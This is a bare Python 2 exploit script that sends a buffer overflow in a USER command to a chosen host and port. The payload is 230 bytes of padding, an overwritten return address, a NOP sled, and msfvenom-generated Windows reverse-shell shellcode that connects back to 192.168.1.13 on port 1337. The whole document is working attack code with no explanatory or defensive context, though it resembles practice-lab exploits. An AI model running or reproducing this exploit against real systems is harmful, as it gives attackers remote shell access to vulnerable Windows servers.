#!/usr/bin/python
import socket
import sys

if (len(sys.argv) != 3):
    print "Usage: python " + sys.argv[0] + " <IP> <PORT>"
    sys.exit()
host = sys.argv[1]
port = sys.argv[2]

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.13 LPORT=1337 -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d"
shellcode = ("\xbb\x49\xc8\xa5\x10\xda\xc6\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
"\x52\x31\x5e\x12\x03\x5e\x12\x83\x8f\xcc\x47\xe5\xf3\x25\x05"
"\x06\x0b\xb6\x6a\x8e\xee\x87\xaa\xf4\x7b\xb7\x1a\x7e\x29\x34"
"\xd0\xd2\xd9\xcf\x94\xfa\xee\x78\x12\xdd\xc1\x79\x0f\x1d\x40"
"\xfa\x52\x72\xa2\xc3\x9c\x87\xa3\x04\xc0\x6a\xf1\xdd\x8e\xd9"
"\xe5\x6a\xda\xe1\x8e\x21\xca\x61\x73\xf1\xed\x40\x22\x89\xb7"
"\x42\xc5\x5e\xcc\xca\xdd\x83\xe9\x85\x56\x77\x85\x17\xbe\x49"
"\x66\xbb\xff\x65\x95\xc5\x38\x41\x46\xb0\x30\xb1\xfb\xc3\x87"
"\xcb\x27\x41\x13\x6b\xa3\xf1\xff\x8d\x60\x67\x74\x81\xcd\xe3"
"\xd2\x86\xd0\x20\x69\xb2\x59\xc7\xbd\x32\x19\xec\x19\x1e\xf9"
"\x8d\x38\xfa\xac\xb2\x5a\xa5\x11\x17\x11\x48\x45\x2a\x78\x05"
"\xaa\x07\x82\xd5\xa4\x10\xf1\xe7\x6b\x8b\x9d\x4b\xe3\x15\x5a"
"\xab\xde\xe2\xf4\x52\xe1\x12\xdd\x90\xb5\x42\x75\x30\xb6\x08"
"\x85\xbd\x63\x9e\xd5\x11\xdc\x5f\x85\xd1\x8c\x37\xcf\xdd\xf3"
"\x28\xf0\x37\x9c\xc3\x0b\xd0\x63\xbb\x12\x2d\x0c\xbe\x14\x28"
"\xf5\x37\xf2\x58\x15\x1e\xad\xf4\x8c\x3b\x25\x64\x50\x96\x40"
"\xa6\xda\x15\xb5\x69\x2b\x53\xa5\x1e\xdb\x2e\x97\x89\xe4\x84"
"\xbf\x56\x76\x43\x3f\x10\x6b\xdc\x68\x75\x5d\x15\xfc\x6b\xc4"
"\x8f\xe2\x71\x90\xe8\xa6\xad\x61\xf6\x27\x23\xdd\xdc\x37\xfd"
"\xde\x58\x63\x51\x89\x36\xdd\x17\x63\xf9\xb7\xc1\xd8\x53\x5f"
"\x97\x12\x64\x19\x98\x7e\x12\xc5\x29\xd7\x63\xfa\x86\xbf\x63"
"\x83\xfa\x5f\x8b\x5e\xbf\x50\xc6\xc2\x96\xf8\x8f\x97\xaa\x64"
"\x30\x42\xe8\x90\xb3\x66\x91\x66\xab\x03\x94\x23\x6b\xf8\xe4"
"\x3c\x1e\xfe\x5b\x3c\x0b")     #size = 351
buff = 'A' * 230 + '\x4F\x2D\x51\x76' + '\x90' * 20 + shellcode
print "Sending 300 Bytes...\r\n"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, int(port)))
print s.recv(1024)
s.send("USER " + buff + "\r\n")
s.close()
